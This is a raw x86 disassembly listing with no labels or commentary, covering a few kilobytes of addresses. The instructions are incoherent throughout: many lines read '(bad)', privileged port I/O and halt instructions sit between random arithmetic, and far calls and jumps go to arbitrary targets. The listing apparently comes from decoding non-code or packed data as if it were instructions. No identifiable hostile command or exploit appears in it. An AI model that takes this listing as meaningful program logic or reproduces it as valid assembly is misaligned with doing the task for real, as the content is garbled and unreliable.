  412b1c:	adc    dl,BYTE PTR [edx+0x4c]
  412b1f:	or     BYTE PTR [edi+0x563411b3],bl
  412b25:	std    
  412b26:	sbb    BYTE PTR [ebx-0x55],al
  412b29:	jp     0x412b3e
  412b2b:	jmp    0xf14178e6
  412b30:	and    al,0x74
  412b32:	inc    esp
  412b33:	js     0x412b1d
  412b35:	xchg   esp,eax
  412b36:	(bad)  
  412b37:	dec    eax
  412b38:	cmp    cl,BYTE PTR [ecx-0x13]
  412b3b:	mov    fs,WORD PTR [edi]
  412b3d:	fstp   DWORD PTR [ebx-0x6f]
  412b40:	aaa    
  412b41:	imul   ebp,DWORD PTR [ecx-0x4539b17b],0x2c974a
  412b4b:	add    cl,BYTE PTR [ebx+0x5]
  412b4e:	and    eax,ebx
  412b50:	pop    di
  412b52:	hlt    
  412b53:	aad    0xf4
  412b55:	jl     0x412bbc
  412b57:	pop    ss
  412b58:	cmp    BYTE PTR [esi-0x1e],dh
  412b5b:	mov    cl,0xac
  412b5d:	jle    0x412b49
  412b5f:	add    BYTE PTR [eax],bl
  412b61:	jns    0x412af9
  412b63:	lock int3 
  412b65:	hlt    
  412b66:	int3   
  412b67:	pop    edx
  412b68:	adc    eax,0x4216800c
  412b6d:	add    al,0x52
  412b6f:	test   al,0xba
  412b71:	in     eax,dx
  412b72:	loopne 0x412b34
  412b74:	and    ebx,DWORD PTR [edx+0x11]
  412b77:	xor    al,0xc6
  412b79:	push   0xda0b2347
  412b7e:	xchg   edi,eax
  412b7f:	adc    edx,ebx
  412b81:	mov    ebx,0x2b3e6db9
  412b86:	push   esp
  412b87:	(bad)  [ebx+edx*1+0x55]
  412b8b:	or     BYTE PTR [esi],0x60
  412b8e:	aas    
  412b8f:	clc    
  412b90:	dec    ebp
  412b91:	pop    edi
  412b92:	or     DWORD PTR [edi-0x74],esp
  412b95:	mov    dl,0xcb
  412b97:	or     ecx,ebp
  412b99:	xlat   BYTE PTR ds:[ebx]
  412b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b9b:	add    eax,0x2e65664b
  412ba0:	sub    edi,DWORD PTR [ebp-0x6f]
  412ba3:	pop    ebp
  412ba4:	loop   0x412b29
  412ba6:	repz call 0xaa53:0x76015044
  412bae:	mov    esi,0x19ccf530
  412bb3:	into   
  412bb4:	loopne 0x412b3c
  412bb6:	jbe    0x412b7f
  412bb8:	es sti 
  412bba:	adc    al,0xce
  412bbc:	jmp    0x412b68
  412bbe:	std    
  412bbf:	ins    BYTE PTR es:[edi],dx
  412bc0:	jnp    0x412c11
  412bc2:	mov    BYTE PTR [edx],al
  412bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bc5:	icebp  
  412bc6:	sub    DWORD PTR [ebx],ebx
  412bc8:	add    BYTE PTR [esi+esi*2+0x456ba87b],al
  412bcf:	and    bl,BYTE PTR [ecx-0x5ab87ff2]
  412bd5:	jno    0x412bf5
  412bd7:	and    al,0xbb
  412bd9:	bound  eax,QWORD PTR [ecx-0x61]
  412bdc:	mov    ebx,0xab6abad9
  412be1:	retf   
  412be2:	cdq    
  412be3:	mov    dl,0x2c
  412be5:	jno    0x412b83
  412be7:	jp     0x412bdd
  412be9:	mov    esi,esp
  412beb:	add    al,BYTE PTR [edi]
  412bed:	xor    DWORD PTR [esi+0x7d],esp
  412bf0:	jbe    0x412c52
  412bf2:	imul   ebx,DWORD PTR [edx-0x1b1447b9],0x7ccf2326
  412bfc:	shr    DWORD PTR [edx],1
  412bfe:	mov    edx,0xba7b9892
  412c03:	mov    edx,0xbf63395c
  412c08:	shr    ecx,cl
  412c0a:	sub    dl,al
  412c0c:	ins    DWORD PTR es:[edi],dx
  412c0d:	pop    ebp
  412c0e:	(bad)  
  412c0f:	bound  ebx,QWORD PTR [ecx+0x7f]
  412c12:	or     al,0x3d
  412c14:	ja     0x412c63
  412c16:	inc    ebx
  412c17:	(bad)  
  412c18:	out    0xa,eax
  412c1a:	popf   
  412c1b:	mov    esi,0x903dd712
  412c20:	jae    0x412c2b
  412c22:	and    eax,DWORD PTR [ecx]
  412c24:	sub    al,0x1e
  412c26:	mov    ah,0x44
  412c28:	sub    BYTE PTR [eax],bh
  412c2a:	sub    al,0x5d
  412c2c:	sub    eax,0x497b6032
  412c31:	inc    esp
  412c32:	lods   eax,DWORD PTR ds:[esi]
  412c33:	push   esi
  412c34:	mov    bh,0x33
  412c36:	mov    ds:0x940017a3,al
  412c3b:	stos   BYTE PTR es:[edi],al
  412c3c:	xor    DWORD PTR [eax+0x5278e4e6],ecx
  412c42:	add    al,0x32
  412c44:	ret    0xeca5
  412c47:	push   edx
  412c48:	push   ds
  412c49:	sub    esi,edi
  412c4b:	lods   al,BYTE PTR ds:[esi]
  412c4c:	sbb    BYTE PTR [ebp-0x78],al
  412c4f:	xchg   BYTE PTR [edi-0x2ca4f225],dl
  412c55:	mov    ebp,0x382d3506
  412c5a:	inc    ecx
  412c5b:	add    ecx,esp
  412c5d:	mov    DWORD PTR [ecx+0x3a],esi
  412c60:	ds inc ebx
  412c62:	push   ebp
  412c63:	sub    al,0xaa
  412c65:	fwait
  412c66:	dec    ecx
  412c67:	fsubr  QWORD PTR [eax-0x7d]
  412c6a:	rcr    DWORD PTR [esi+eax*4-0x1522a2ce],cl
  412c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c72:	adc    DWORD PTR [edi],ebx
  412c74:	btc    DWORD PTR [esi],edx
  412c77:	fmul   DWORD PTR [edx]
  412c79:	and    bh,BYTE PTR [ebx]
  412c7b:	push   ecx
  412c7c:	xchg   ebp,eax
  412c7d:	dec    esp
  412c7e:	mov    ds:0x99adda04,al
  412c83:	xor    BYTE PTR ds:0xcd59a511,ch
  412c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c8a:	shl    BYTE PTR [ecx-0xe172a6a],cl
  412c90:	test   al,0xaf
  412c92:	out    dx,al
  412c93:	jns    0x412ce1
  412c95:	jo     0x412c8e
  412c97:	ins    BYTE PTR es:[edi],dx
  412c98:	xchg   ebp,eax
  412c99:	icebp  
  412c9a:	sub    esi,edi
  412c9c:	fmul   DWORD PTR [edx+ebp*2+0x2e94f0d9]
  412ca3:	and    ah,bl
  412ca5:	(bad)
  412ca9:	mov    ds:0xd6ef709,al
  412cae:	mov    eax,ds:0x36b03595
  412cb3:	(bad)  
  412cb4:	jbe    0x412c94
  412cb6:	and    al,0x1a
  412cb8:	jne    0x412cce
  412cba:	fstp   TBYTE PTR [ecx+0x47]
  412cbd:	stc    
  412cbe:	jecxz  0x412c79
  412cc0:	pop    ds
  412cc1:	in     al,dx
  412cc2:	pop    esp
  412cc3:	mov    edx,0x2ed94d5c
  412cc8:	dec    ebp
  412cc9:	xchg   ebp,eax
  412cca:	push   edi
  412ccb:	xchg   ecx,eax
  412ccc:	xchg   ebp,eax
  412ccd:	cli    
  412cce:	add    bl,BYTE PTR [eax-0x80]
  412cd1:	xor    al,0x84
  412cd3:	sbb    BYTE PTR [edx-0x3],ah
  412cd6:	push   eax
  412cd7:	mov    bl,0xee
  412cd9:	add    cl,BYTE PTR [ebp+0x38]
  412cdc:	shr    BYTE PTR [eax],1
  412cde:	jecxz  0x412ce3
  412ce0:	inc    esp
  412ce1:	mov    dl,bl
  412ce3:	jne    0x412c7e
  412ce5:	cmp    esp,edx
  412ce7:	leave  
  412ce8:	fist   DWORD PTR [ebx]
  412cea:	ds xor eax,edi
  412ced:	jo     0x412d5d
  412cef:	mov    ds:0x3f1dfbfb,eax
  412cf4:	inc    ebp
  412cf5:	mov    DWORD PTR [ebx],0xc16a2ff5
  412cfb:	iret   
  412cfc:	hlt    
  412cfd:	xchg   edx,eax
  412cfe:	arpl   WORD PTR [edi+0x408faa6],di
  412d04:	and    ebx,esi
  412d06:	lock imul eax,DWORD PTR [edx+0x1f],0xb2c1b904
  412d0e:	mov    bl,0x53
  412d10:	in     al,0xa3
  412d12:	pop    es
  412d13:	fmul   DWORD PTR [esi-0x208da5a0]
  412d19:	xlat   BYTE PTR ds:[ebx]
  412d1a:	xchg   ebx,eax
  412d1b:	mov    ebx,0x7f6f858c
  412d20:	icebp  
  412d21:	xor    esp,DWORD PTR [ecx]
  412d23:	inc    eax
  412d24:	(bad)  
  412d25:	or     ah,BYTE PTR [ebx]
  412d27:	les    ebp,FWORD PTR [esi+ebx*8]
  412d2a:	add    al,0xc3
  412d2c:	and    BYTE PTR [eax],bh
  412d2e:	std    
  412d2f:	push   edx
  412d30:	mov    dh,BYTE PTR [ebp+0x12]
  412d33:	je     0x412d62
  412d35:	popf   
  412d36:	adc    ebp,DWORD PTR [ecx-0x3bb3a8b]
  412d3c:	lods   al,BYTE PTR ds:[esi]
  412d3d:	aas    
  412d3e:	or     ecx,DWORD PTR [ecx+edi*2+0x50]
  412d42:	mov    esi,0x86fa7dae
  412d47:	cmp    edx,DWORD PTR [ecx]
  412d49:	aam    0x2
  412d4b:	std    
  412d4c:	shl    DWORD PTR [edi+0x5b],cl
  412d4f:	lds    edx,FWORD PTR [ebx]
  412d51:	aam    0xaf
  412d53:	sahf   
  412d54:	add    ebx,ecx
  412d56:	mov    ah,0x3a
  412d58:	push   eax
  412d59:	inc    esi
  412d5a:	push   0xe09fa635
  412d5f:	in     al,dx
  412d60:	pop    ebx
  412d61:	xlat   BYTE PTR ds:[ebx]
  412d62:	mov    esp,0x9e82d177
  412d67:	imul   edi,DWORD PTR [esi+ebx*8-0x4b25a7f4],0x24ea3bb1
  412d72:	aaa    
  412d73:	sub    eax,DWORD PTR [ecx-0x64740574]
  412d79:	inc    ebx
  412d7a:	lock add DWORD PTR [eax],edx
  412d7d:	hlt    
  412d7e:	in     eax,dx
  412d7f:	jb     0x412d50
  412d81:	arpl   WORD PTR [ebp+edx*2-0x11],cx
  412d85:	into   
  412d86:	jae    0x412dc5
  412d88:	test   eax,0xe5ca651a
  412d8d:	jge    0x412d3c
  412d8f:	cwde   
  412d90:	jge    0x412d9b
  412d92:	in     al,0x87
  412d94:	dec    edi
  412d95:	and    BYTE PTR [ecx-0x52599320],ch
  412d9b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  412d9d:	cli    
  412d9e:	retf   0x4bf
  412da1:	mov    ebx,0x2c59cb9
  412da6:	jno    0x412dad
  412da8:	pushf  
  412da9:	adc    edi,ecx
  412dab:	sbb    al,0x19
  412dad:	adc    eax,0x1abe461d
  412db2:	pop    edi
  412db3:	pop    eax
  412db4:	fwait
  412db5:	dec    ecx
  412db6:	dec    BYTE PTR [ecx]
  412db8:	fdiv   DWORD PTR [ebp-0x2e2a85cb]
  412dbe:	inc    edx
  412dbf:	je     0x412d83
  412dc1:	(bad)  
  412dc2:	dec    edi
  412dc3:	add    eax,0xf01ae1c2
  412dc8:	push   0xd5cbb748
  412dcd:	gs pop ebp
  412dcf:	imul   esi,DWORD PTR [eax+0x3fc51ec9],0xf8080418
  412dd9:	push   cs
  412dda:	out    dx,eax
  412ddb:	aas    
  412ddc:	push   ebx
  412ddd:	into   
  412dde:	adc    BYTE PTR [edx],bl
  412de0:	pushf  
  412de1:	ret    0x6814
  412de4:	shr    BYTE PTR ds:0x940e01ad,cl
  412dea:	sar    bl,cl
  412dec:	sbb    BYTE PTR [edx-0x40407e16],bl
  412df2:	repz jmp edx
  412df5:	dec    ebx
  412df6:	cli    
  412df7:	std    
  412df8:	pop    di
  412dfa:	cmp    al,0xc
  412dfc:	mov    ecx,0x53635ea2
  412e01:	add    BYTE PTR [ecx],dl
  412e03:	xor    DWORD PTR [ecx-0x14ca14b],ebx
  412e09:	mov    ecx,0xe81ba742
  412e0e:	add    BYTE PTR [eax],bl
  412e10:	xchg   DWORD PTR [esi+0x38],ebx
  412e13:	jg     0x412ddb
  412e15:	xor    DWORD PTR [edx+esi*8+0xa161d13],0x3e6d30e2
  412e20:	repz adc BYTE PTR [ebp+0x43dac94b],bh
  412e27:	jg     0x412e44
  412e29:	mov    ds:0x535472c1,al
  412e2e:	add    dl,cl
  412e30:	push   esp
  412e31:	adc    BYTE PTR [edx-0xe],cl
  412e34:	sahf   
  412e35:	aas    
  412e36:	loope  0x412e86
  412e38:	push   es
  412e39:	and    DWORD PTR [esi-0x72f9cd76],0x4d9533f7
  412e43:	call   0x1005:0xfd98f6f7
  412e4a:	mov    ds:0xe80286ec,al
  412e4f:	hlt    
  412e50:	jl     0x412df3
  412e52:	cmp    esp,edi
  412e54:	push   ecx
  412e55:	xchg   esp,eax
  412e56:	jge    0x412e4e
  412e58:	ja     0x412ea9
  412e5a:	fisub  WORD PTR [esi-0x174485b9]
  412e60:	pop    es
  412e61:	test   DWORD PTR [edi+0x69],ecx
  412e64:	cs pop eax
  412e66:	out    dx,eax
  412e67:	push   0xffffff80
  412e69:	xor    ebx,DWORD PTR [esi+eax*8-0x4e4d201b]
  412e70:	imul   ebp,DWORD PTR [edi-0x1d],0x7
  412e74:	js     0x412ebb
  412e76:	retf   0x7296
  412e79:	xchg   edx,eax
  412e7a:	xor    eax,0x75fcb555
  412e7f:	dec    edx
  412e80:	cmp    eax,0x687748dd
  412e85:	rcr    BYTE PTR [ebp+0x2916bdf1],1
  412e8b:	arpl   WORD PTR [esi+0x248e4457],di
  412e91:	shr    edi,1
  412e93:	sbb    edx,DWORD PTR [ebp-0x10]
  412e96:	cmp    al,0xa4
  412e98:	repz xor bl,BYTE PTR [ebp-0x2f]
  412e9c:	shr    BYTE PTR [esi-0x28],1
  412e9f:	sub    DWORD PTR [edi+0x6a],esi
  412ea2:	mov    WORD PTR [ebx],?
  412ea4:	ss ret 0x74ba
  412ea8:	add    eax,0x16e653c9
  412ead:	mov    edi,0x755bacf9
  412eb2:	mov    edx,db2
  412eb5:	retf   0x8782
  412eb8:	clc    
  412eb9:	add    BYTE PTR [ecx+0x7c],0x26
  412ebd:	int    0x2e
  412ebf:	jae    0x412ea0
  412ec1:	cli    
  412ec2:	jecxz  0x412e8b
  412ec4:	arpl   WORD PTR [esi+0x7bb764eb],ax
  412eca:	or     DWORD PTR [eax],eax
  412ecc:	cmp    BYTE PTR [ebp+0x6ae3bb33],cl
  412ed2:	rol    BYTE PTR [eax+0x6f],0x21
  412ed6:	aad    0xa6
  412ed8:	sahf   
  412ed9:	jle    0x412eb0
  412edb:	mov    ebp,0x40cfb5ea
  412ee0:	push   esi
  412ee1:	clc    
  412ee2:	in     al,0x46
  412ee4:	fisttp WORD PTR [edi]
  412ee6:	mov    BYTE PTR [edx-0x5b],dl
  412ee9:	jmp    0x31a92ac8
  412eee:	aam    0x9
  412ef0:	inc    edx
  412ef1:	aam    0x58
  412ef3:	lods   eax,DWORD PTR ds:[esi]
  412ef4:	or     al,0x5a
  412ef6:	bound  esp,QWORD PTR [esi-0x196a9ebf]
  412efc:	stc    
  412efd:	jecxz  0x412f08
  412eff:	mov    ebp,eax
  412f01:	call   0x90b9:0x61364194
  412f08:	ds out 0xe9,al
  412f0b:	inc    ebx
  412f0c:	push   edi
  412f0d:	mov    esp,0xb2084b56
  412f12:	sub    DWORD PTR gs:[edi+0x10],0xa0d5ead0
  412f1a:	sub    bh,BYTE PTR [eax+0x23d2b64b]
  412f20:	je     0x412f57
  412f22:	cmp    esi,edi
  412f24:	adc    al,0x1d
  412f26:	aad    0x30
  412f28:	mov    edx,0xcfb263df
  412f2d:	xchg   esi,eax
  412f2e:	fcmovu st,st(4)
  412f30:	jno    0x412ed4
  412f32:	mov    ebx,0xacb8562b
  412f37:	add    eax,0x644866cb
  412f3c:	lods   al,BYTE PTR ds:[esi]
  412f3d:	mov    ch,0x15
  412f3f:	rol    BYTE PTR [ecx+ecx*4],0xe2
  412f43:	sahf   
  412f44:	add    BYTE PTR [ecx],bh
  412f46:	fwait
  412f47:	lock es xchg ch,bh
  412f4b:	mov    ecx,0xd4ad15a5
  412f50:	jle    0x412f83
  412f52:	push   0xec7889c
  412f57:	outs   dx,BYTE PTR ds:[esi]
  412f58:	je     0x412eed
  412f5a:	dec    ebx
  412f5b:	inc    ecx
  412f5c:	add    bl,0xfd
  412f5f:	call   0x5b16444
  412f64:	xor    edx,DWORD PTR [edi-0x1f14cca1]
  412f6a:	jl     0x412f10
  412f6c:	ins    BYTE PTR es:[edi],dx
  412f6d:	mov    al,0xc
  412f6f:	and    ecx,0x5e
  412f72:	daa    
  412f73:	cli    
  412f74:	mov    ecx,ebx
  412f76:	add    al,BYTE PTR [edi]
  412f78:	xchg   esp,eax
  412f79:	shl    DWORD PTR [edx-0x5039237c],1
  412f7f:	(bad)  
  412f80:	jecxz  0x412f38
  412f82:	lods   eax,DWORD PTR ds:[esi]
  412f83:	mov    al,0x71
  412f85:	fnstenv [esi]
  412f87:	(bad)  
  412f88:	pop    ds
  412f89:	js     0x412f40
  412f8b:	push   ecx
  412f8c:	xchg   edi,eax
  412f8d:	jns    0x412fb9
  412f8f:	mov    esi,0xb23d9667
  412f94:	pop    esp
  412f95:	mov    esp,0x9da18b96
  412f9a:	pop    ds
  412f9b:	ja     0x412fe9
  412f9d:	push   ebp
  412f9e:	xchg   al,cl
  412fa0:	outs   dx,DWORD PTR ds:[esi]
  412fa1:	push   edx
  412fa2:	stos   BYTE PTR es:[edi],al
  412fa3:	(bad)  
  412fa4:	mov    ecx,0x61c2bfd3
  412fa9:	repnz push edi
  412fab:	mov    cl,0x81
  412fad:	mov    ebx,0x3f87dad5
  412fb2:	sbb    ebx,ebp
  412fb4:	lods   eax,DWORD PTR ds:[esi]
  412fb5:	mov    eax,0xcc4a762a
  412fba:	and    ah,BYTE PTR [eax+0x6a]
  412fbd:	xchg   esi,eax
  412fbe:	mov    dh,0x26
  412fc0:	and    eax,0xfbc24361
  412fc5:	sub    edx,0x389af688
  412fcb:	mov    ds:0x66a89e40,al
  412fd0:	push   edx
  412fd1:	ja     0x413026
  412fd3:	push   bx
  412fd5:	push   edi
  412fd6:	ret    
  412fd7:	push   ebp
  412fd8:	int3   
  412fd9:	pop    ds
  412fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fdb:	arpl   WORD PTR ds:0xc07f2118,sp
  412fe1:	leave  
  412fe2:	ja     0x412f64
  412fe4:	rcr    edx,0x38
  412fe7:	leave  
  412fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fe9:	pushf  
  412fea:	out    dx,al
  412feb:	mov    es,WORD PTR [ecx-0x55]
  412fee:	push   0xffffffb5
  412ff0:	stc    
  412ff1:	mov    esi,DWORD PTR es:[edx+0x5d]
  412ff5:	shr    ecx,0xa8
  412ff8:	gs xchg ecx,eax
  412ffa:	mov    ecx,0x563eb986
  412fff:	mov    al,ds:0xb8ea0d34
  413004:	pusha  
  413005:	test   eax,0x4769623f
  41300a:	call   0xd7a4:0xacabb891
  413011:	add    eax,0x5696d005
  413016:	mov    bl,0x95
  413018:	mov    ?,esp
  41301a:	(bad)  
  41301b:	in     al,dx
  41301c:	popf   
  41301d:	imul   edi,DWORD PTR [ebx-0x939e3bb],0xffffffe0
  413024:	cwde   
  413025:	adc    dl,BYTE PTR [ecx-0x6f9b9886]
  41302b:	xchg   ebp,eax
  41302c:	cmp    DWORD PTR [esi+eiz*8],ecx
  41302f:	mov    ah,0x91
  413031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413032:	int    0x11
  413034:	(bad)  
  413035:	push   ebp
  413036:	in     al,dx
  413037:	mov    ch,0x9a
  413039:	das    
  41303a:	inc    eax
  41303b:	(bad)  
  41303c:	in     al,0x2f
  41303e:	pop    ds
  41303f:	lock ja 0x41308a
  413042:	dec    ecx
  413043:	cmp    al,0x79
  413045:	stos   DWORD PTR es:[edi],eax
  413046:	push   0xc219834a
  41304b:	daa    
  41304c:	fldenv [eax+0x68]
  41304f:	in     al,dx
  413050:	add    BYTE PTR [edi-0x118c9fb4],dl
  413056:	pop    ss
  413057:	mov    WORD PTR [ecx+0x4f],fs
  41305a:	mov    ch,0xd0
  41305c:	adc    esp,DWORD PTR [esi+0x55]
  41305f:	cmp    al,0x82
  413061:	mov    cl,0x96
  413063:	bound  edi,QWORD PTR [ecx]
  413065:	xor    dl,cl
  413067:	pop    ds
  413068:	and    dl,BYTE PTR [esi]
  41306a:	bound  edx,QWORD PTR [edx]
  41306c:	arpl   WORD PTR ds:0xa6be8511,di
  413072:	mov    dl,0x7a
  413074:	or     DWORD PTR [esi+0x4],esi
  413077:	test   BYTE PTR [edx],ah
  413079:	arpl   WORD PTR [esi+0x10],sp
  41307c:	popf   
  41307d:	mov    ebx,0x7bbe5366
  413082:	nop
  413083:	xor    al,0x1d
  413085:	sbb    eax,DWORD PTR [edi]
  413087:	dec    esi
  413088:	(bad)  
  413089:	ins    DWORD PTR es:[edi],dx
  41308a:	loopne 0x41300e
  41308c:	xor    eax,0x7ed28c45
  413091:	in     al,0x13
  413093:	inc    edx
  413094:	lods   eax,DWORD PTR ds:[esi]
  413095:	push   edi
  413096:	mov    cl,0x88
  413098:	xchg   esi,eax
  413099:	inc    edi
  41309a:	and    cl,ah
  41309c:	outs   dx,DWORD PTR ds:[esi]
  41309d:	xchg   ebp,eax
  41309e:	xchg   esi,eax
  41309f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a0:	mov    BYTE PTR [edx+0x4bae3979],al
  4130a6:	std    
  4130a7:	jg     0x413122
  4130a9:	adc    BYTE PTR [ebx],bl
  4130ab:	loope  0x41306d
  4130ad:	mov    dl,0x7e
  4130af:	add    ch,ch
  4130b1:	xor    BYTE PTR [ebp-0x47],ch
  4130b4:	xor    ebx,edi
  4130b6:	(bad)
  4130b9:	mov    ebp,0xf2f91af4
  4130be:	push   ss
  4130bf:	aam    0xd
  4130c1:	add    eax,0xf8118d54
  4130c6:	jmp    0x4130ad
  4130c8:	mov    al,BYTE PTR [edx]
  4130ca:	dec    ebp
  4130cb:	out    0x5e,eax
  4130cd:	fwait
  4130ce:	mov    al,ds:0xefd12257
  4130d3:	sub    al,0x37
  4130d5:	scas   eax,DWORD PTR es:[edi]
  4130d6:	or     dl,ah
  4130d8:	pop    DWORD PTR [esi-0x6e858d46]
  4130de:	add    al,0x8e
  4130e0:	ja     0x413071
  4130e2:	scas   eax,DWORD PTR es:[edi]
  4130e3:	sbb    al,0x5e
  4130e5:	and    al,0xfb
  4130e7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130e9:	cmp    eax,0x532ebebc
  4130ee:	mul    BYTE PTR [edx-0x58fbf5c4]
  4130f4:	popf   
  4130f5:	sahf   
  4130f6:	or     eax,0x4d32ed9a
  4130fb:	dec    esp
  4130fc:	sbb    DWORD PTR [ecx+ebp*8-0x1038e7e3],0xffffffd6
  413104:	jne    0x413149
  413106:	retf   0xff66
  413109:	(bad)  
  41310a:	(bad)  
  41310b:	adc    al,0x11
  41310d:	ret    0x5e7c
  413110:	popa   
  413111:	sbb    DWORD PTR [eax+0x60],esi
  413114:	add    edi,DWORD PTR [ebp-0x67c0243b]
  41311a:	xchg   edx,eax
  41311b:	into   
  41311c:	lods   al,BYTE PTR ds:[esi]
  41311d:	xchg   DWORD PTR [ebp+0x5],ebx
  413120:	fidiv  DWORD PTR [edx+eax*8-0x23b2421b]
  413127:	outs   dx,DWORD PTR ds:[esi]
  413128:	arpl   WORD PTR [ecx+eax*8-0x9],cx
  41312c:	mov    ah,BYTE PTR [ecx+0x62]
  41312f:	fstp   QWORD PTR [edi-0x21]
  413132:	int    0x2d
  413134:	xchg   edx,eax
  413135:	jle    0x413120
  413137:	and    ecx,esp
  413139:	call   0x801a7c84
  41313e:	xchg   ebp,eax
  41313f:	push   ebx
  413140:	mov    bl,0xb0
  413142:	dec    edi
  413143:	mov    bh,0x2f
  413145:	out    0xad,al
  413147:	sbb    ecx,edx
  413149:	jmp    0x41315f
  41314b:	in     eax,dx
  41314c:	sbb    ecx,esp
  41314e:	(bad)  
  41314f:	fistp  QWORD PTR [eax]
  413151:	jno    0x413173
  413153:	xor    cl,dl
  413155:	fild   QWORD PTR [ebx]
  413157:	xchg   ecx,eax
  413158:	cld    
  413159:	push   0x81ec9886
  41315e:	(bad)  
  41315f:	std    
  413160:	push   ds
  413161:	jo     0x413146
  413163:	cmc    
  413164:	(bad)  
  413165:	mov    dl,0x77
  413167:	sbb    BYTE PTR [esi],ah
  413169:	mov    dl,0x60
  41316b:	xchg   ecx,eax
  41316c:	push   es
  41316d:	or     DWORD PTR cs:0x4e6ffdaf,ebx
  413174:	xor    BYTE PTR [edi+ebp*8],al
  413177:	retf   0xf9d8
  41317a:	xlat   BYTE PTR ds:[ebx]
  41317b:	js     0x4130ff
  41317d:	lods   eax,DWORD PTR ds:[esi]
  41317e:	imul   ebx,DWORD PTR [edi-0x1d0eba26],0x4e5d4b78
  413188:	pop    eax
  413189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41318a:	sbb    ebx,DWORD PTR [ecx-0x53]
  41318d:	add    DWORD PTR [ebx],esi
  41318f:	loope  0x4131c1
  413191:	scas   eax,DWORD PTR es:[edi]
  413192:	sub    eax,0x8f880a09
  413197:	xor    BYTE PTR [edx-0x28],0xc1
  41319b:	call   0x134f:0xa423f5e9
  4131a2:	ja     0x413178
  4131a4:	clc    
  4131a5:	and    edi,DWORD PTR [edx+ebx*1]
  4131a8:	ret    
  4131a9:	and    al,0xa8
  4131ab:	inc    edi
  4131ac:	out    dx,al
  4131ad:	mov    ah,0xed
  4131af:	jge    0x4131a7
  4131b1:	test   DWORD PTR [ecx],ecx
  4131b3:	mov    ah,0xbf
  4131b5:	out    dx,eax
  4131b6:	jbe    0x4131e4
  4131b8:	repz pop edx
  4131ba:	stos   BYTE PTR es:[edi],al
  4131bb:	and    ah,BYTE PTR [eax]
  4131bd:	inc    eax
  4131be:	fisubr WORD PTR [edx+edi*2-0x7c]
  4131c2:	daa    
  4131c3:	adc    bh,BYTE PTR [edi]
  4131c5:	call   0x1d5e3c6e
  4131ca:	in     al,0x66
  4131cc:	and    ah,BYTE PTR [edx+ecx*4]
  4131cf:	jg     0x413180
  4131d1:	aam    0xa6
  4131d3:	pop    ecx
  4131d4:	neg    BYTE PTR [edx]
  4131d6:	outs   dx,BYTE PTR ds:[esi]
  4131d7:	repnz into 
  4131d9:	int    0xc8
  4131db:	stc    
  4131dc:	xchg   esi,eax
  4131dd:	loopne 0x413234
  4131df:	cmp    BYTE PTR [edi+0x61],0x4a
  4131e3:	mov    ds:0x957ca348,al
  4131e8:	inc    esp
  4131e9:	ret    0xb0b3
  4131ec:	jp     0x41319f
  4131ee:	xchg   esi,eax
  4131ef:	pop    eax
  4131f0:	cmp    eax,0xadd97b52
  4131f5:	dec    ecx
  4131f6:	test   dl,0xa6
  4131f9:	retf   
  4131fa:	or     al,0x64
  4131fc:	push   eax
  4131fd:	cdq    
  4131fe:	neg    BYTE PTR [ecx+0xcb72456]
  413204:	adc    esp,edi
  413206:	xchg   edx,eax
  413207:	in     al,0xeb
  413209:	or     DWORD PTR [ebx+0x39a9fc37],ecx
  41320f:	mov    WORD PTR [ecx-0x67],ss
  413212:	sbb    BYTE PTR [eax],0xe9
  413215:	hlt    
  413216:	push   ecx
  413218:	lock fld st(3)
  41321b:	iret   
  41321c:	and    eax,0xbb12f89d
  413221:	loopne 0x4131f6
  413223:	jmp    0x413275
  413225:	adc    eax,0x6676d7d1
  41322a:	les    edi,FWORD PTR [ecx]
  41322c:	add    al,0x3
  41322e:	sbb    ebp,DWORD PTR [edx-0x14]
  413231:	aad    0x10
  413233:	sub    esp,DWORD PTR [esi+esi*8+0x3e]
  413237:	sbb    DWORD PTR [edx],ebp
  413239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41323a:	dec    edx
  41323b:	fbld   TBYTE PTR [ecx]
  41323d:	xor    ah,bh
  41323f:	push   es
  413240:	enter  0x66f1,0xfa
  413244:	popa   
  413245:	mov    eax,ds:0x7bc2eb8f
  41324a:	adc    ah,BYTE PTR [edx-0x602de506]
  413250:	test   DWORD PTR [ebp-0x1c63912e],0xa051d38f
  41325a:	das    
  41325b:	jae    0x41326a
  41325d:	fcomp  DWORD PTR [eax+0x44901851]
  413263:	mov    ecx,0xb9c7e08b
  413268:	add    al,0x88
  41326a:	ret    
  41326b:	fwait
  41326c:	xchg   edi,eax
  41326d:	stos   DWORD PTR es:[edi],eax
  41326e:	shl    BYTE PTR [edi],cl
  413270:	adc    DWORD PTR [eax+0x76],0xcf8a9855
  413277:	ret    0x2556
  41327a:	xor    dh,BYTE PTR [ebp-0x540867d9]
  413280:	test   al,0x19
  413282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413283:	(bad)  
  413284:	sahf   
  413285:	loopne 0x4132f3
  413287:	sbb    BYTE PTR [eax],ah
  413289:	je     0x413277
  41328b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41328c:	jbe    0x413306
  41328e:	aaa    
  41328f:	aad    0x25
  413291:	or     al,0x5c
  413293:	adc    al,0x52
  413295:	ja     0x413305
  413297:	xor    al,0xa8
  413299:	sub    BYTE PTR [edi+0xe14144c],al
  41329f:	popf   
  4132a0:	and    eax,0x45b86c9d
  4132a5:	call   0xa2c1:0x7bea4afd
  4132ac:	aas    
  4132ad:	push   ss
  4132ae:	inc    edi
  4132af:	adc    eax,0x168c4e21
  4132b4:	mov    ds:0x76bcda5a,eax
  4132b9:	xchg   ecx,eax
  4132ba:	stos   BYTE PTR es:[edi],al
  4132bb:	dec    ecx
  4132bc:	mov    ss,WORD PTR [ecx]
  4132be:	push   cs
  4132bf:	xor    ecx,ebp
  4132c1:	out    dx,eax
  4132c2:	mov    eax,0xab80088e
  4132c7:	ja     0x413312
